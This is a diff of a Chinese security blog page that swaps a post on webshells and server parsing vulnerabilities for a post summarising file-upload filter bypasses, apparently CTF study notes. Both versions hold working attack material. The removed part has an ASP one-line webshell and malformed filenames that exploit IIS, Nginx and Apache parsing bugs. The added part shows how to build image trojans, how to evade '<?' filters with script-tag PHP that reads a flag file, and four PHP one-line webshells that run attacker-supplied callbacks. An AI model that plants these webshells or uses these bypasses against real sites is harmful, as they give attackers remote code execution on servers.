@@ -6,20 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>webshell 上传/解析漏洞 | cruoni的博客</title>
+  <title>upload 文件上传绕过方法总结 | cruoni的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="什么是WebshellWebshell定义Web服务端的一种脚本工具 Webshell功能 环境探针 资源管理器 文件编辑器 执行OS命令 读取注册表 创建Socket 调用系统组件  Webshell的分类功能强弱分为大马、小马、一句话木马 一句话木马：%eval request(&amp;quot;pass&amp;quot;)%&amp;gt;eval 将request(“pass”)转化成代码执行 request">
-<meta name="keywords" content="web">
+  <meta name="description" content="文件上传[toc] 绕过方法 burp抓包 改后缀绕过 1.php .jpg  00截断绕过 图片马 + 解析漏洞绕过 图片马制作方法：  12Windows DOS:copy 1.jpg/b + 2.php/a tu.jpg  特殊的PHP代码格式 .php4 .php5也能被解析 （fast-cgi）里配置 正则检测文件内容中包含 &amp;lt;? 就异常退出，通常的PHP代码就不行了，可以使用这种">
+<meta name="keywords" content="机器学习 计算机视觉 信息安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="webshell 上传&#x2F;解析漏洞">
-<meta property="og:url" content="http://yoursite.com/2019/07/25/webshell-上传-解析漏洞/index.html">
+<meta property="og:title" content="upload 文件上传绕过方法总结">
+<meta property="og:url" content="http://yoursite.com/2019/08/14/upload/index.html">
 <meta property="og:site_name" content="cruoni的博客">
-<meta property="og:description" content="什么是WebshellWebshell定义Web服务端的一种脚本工具 Webshell功能 环境探针 资源管理器 文件编辑器 执行OS命令 读取注册表 创建Socket 调用系统组件  Webshell的分类功能强弱分为大马、小马、一句话木马 一句话木马：%eval request(&amp;quot;pass&amp;quot;)%&amp;gt;eval 将request(“pass”)转化成代码执行 request">
+<meta property="og:description" content="文件上传[toc] 绕过方法 burp抓包 改后缀绕过 1.php .jpg  00截断绕过 图片马 + 解析漏洞绕过 图片马制作方法：  12Windows DOS:copy 1.jpg/b + 2.php/a tu.jpg  特殊的PHP代码格式 .php4 .php5也能被解析 （fast-cgi）里配置 正则检测文件内容中包含 &amp;lt;? 就异常退出，通常的PHP代码就不行了，可以使用这种">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-14T08:13:14.823Z">
+<meta property="og:updated_time" content="2019-08-14T08:14:42.815Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="webshell 上传&#x2F;解析漏洞">
-<meta name="twitter:description" content="什么是WebshellWebshell定义Web服务端的一种脚本工具 Webshell功能 环境探针 资源管理器 文件编辑器 执行OS命令 读取注册表 创建Socket 调用系统组件  Webshell的分类功能强弱分为大马、小马、一句话木马 一句话木马：%eval request(&amp;quot;pass&amp;quot;)%&amp;gt;eval 将request(“pass”)转化成代码执行 request">
+<meta name="twitter:title" content="upload 文件上传绕过方法总结">
+<meta name="twitter:description" content="文件上传[toc] 绕过方法 burp抓包 改后缀绕过 1.php .jpg  00截断绕过 图片马 + 解析漏洞绕过 图片马制作方法：  12Windows DOS:copy 1.jpg/b + 2.php/a tu.jpg  特殊的PHP代码格式 .php4 .php5也能被解析 （fast-cgi）里配置 正则检测文件内容中包含 &amp;lt;? 就异常退出，通常的PHP代码就不行了，可以使用这种">
   
     <link rel="alternative" href="/atom.xml" title="cruoni的博客" type="application/atom+xml">
   
@@ -145,44 +145,45 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-webshell-上传-解析漏洞" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-upload" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      webshell 上传/解析漏洞
+      upload 文件上传绕过方法总结
     </h1>
   
 
         
-        <a href="/2019/07/25/webshell-上传-解析漏洞/" class="archive-article-date">
-  	<time datetime="2019-07-25T07:48:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-25</time>
+        <a href="/2019/08/14/upload/" class="archive-article-date">
+  	<time datetime="2019-08-14T07:46:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-14</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1><span id="什么是webshell">什么是Webshell</span></h1><h2><span id="webshell定义">Webshell定义</span></h2><p>Web服务端的一种脚本工具</p>
-<h2><span id="webshell功能">Webshell功能</span></h2><ol>
-<li>环境探针</li>
-<li>资源管理器</li>
-<li>文件编辑器</li>
-<li>执行OS命令</li>
-<li>读取注册表</li>
-<li>创建Socket</li>
-<li>调用系统组件</li>
+        <h1><span id="文件上传">文件上传</span></h1><p>[toc]</p>
+<h2><span id="绕过方法">绕过方法</span></h2><ol>
+<li>burp抓包 改后缀绕过</li>
+<li>1.php .jpg  00截断绕过</li>
+<li><p>图片马 + 解析漏洞绕过<br> 图片马制作方法：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows DOS:</span><br><span class="line">copy 1.jpg/b + 2.php/a tu.jpg</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>特殊的PHP代码格式<br> .php4 .php5也能被解析 （fast-cgi）里配置<br> 正则检测文件内容中包含 &lt;? 就异常退出，通常的PHP代码就不行了，可以使用这种方式绕过</p>
+</li>
 </ol>
-<h2><span id="webshell的分类">Webshell的分类</span></h2><p>功能强弱分为大马、小马、一句话木马</p>
-<p>一句话木马：<br><code>%eval request(&quot;pass&quot;)%&gt;</code><br>eval 将request(“pass”)转化成代码执行 request功能：引用外部文件</p>
-<p>IIS 5.X/6.0 解析漏洞</p>
-<p>Is7.0/ IIS 7.5 /Nginx &lt; 0.83 畸形解析漏洞<br>xxx.jpg/.php</p>
-<p>Nginx 0.5 0.6 0.7-0.7.65 0.8-0.8.37 空字节代码执行漏洞<br>xxx.jpg%00.php</p>
-<p>Apache解析漏洞</p>
-<p>windows 不允许这两个文件存在 （末尾为.或空格）<br>xx.jpg.  xx.jpg_ (_为空格)<br>上传成功后会自动把 . _ 去掉</p>
-
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"PHP"</span>&gt; <span class="comment">#注：此处的PHP可大小写绕过</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'test'</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>访问结果为test  </p>
+<p>读取flag.php 可以使用连接字符串绕过或strtolower(‘PHP’)绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;script language=<span class="string">"PHP"</span>&gt;</span><br><span class="line"><span class="keyword">echo</span>((file_get_contents(<span class="string">'../flag.'</span>.<span class="string">'p'</span>.<span class="string">'h'</span>.<span class="string">'p'</span>)));</span><br><span class="line"> &lt;/script&gt;</span><br><span class="line"> <span class="comment">#查看页面源代码</span></span><br></pre></td></tr></table></figure></p>
+<p><a href="https://blog.csdn.net/yilovexing/article/details/52711673" target="_blank" rel="noopener">php读取文件的五种方式</a></p>
+<h2><span id="php一句话">php一句话</span></h2><figure class="highlight plain"><figcaption><span>被过滤可用 ``` <script language<="" span=""></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(&quot;test&quot;)&lt;/script&gt;```绕过</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&apos;e&apos;];</span><br><span class="line">register_shutdown_function($e, $_REQUEST[&apos;pass&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'e'</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function ($e, $_REQUEST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var($_REQUEST[<span class="string">'pass'</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">'options'</span> =&gt; <span class="string">'assert'</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> filter_var_array(<span class="keyword">array</span>(<span class="string">'test'</span> =&gt; $_REQUEST[<span class="string">'pass'</span>]), <span class="keyword">array</span>(<span class="string">'test'</span> =&gt; <span class="keyword">array</span>(<span class="string">'filter'</span> =&gt; FILTER_CALLBACK, <span class="string">'options'</span> =&gt; <span class="string">'assert'</span>)));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</script></span></figcaption></figure>
       
 
       
@@ -211,17 +212,6 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -272,7 +262,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/07/25/webshell-上传-解析漏洞/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/14/upload/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -286,18 +276,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/07/30/CG-CTF-Web/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/08/14/php奇技淫巧/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          CG-CTF Web
+          php奇技淫巧
         
       </div>
     </a>
   
   
-    <a href="/2019/07/25/SSRF/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">SSRF</div>
+    <a href="/2019/08/14/5G/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">5G</div>
       <i class="icon-circle-right"></i>
     </a>
   
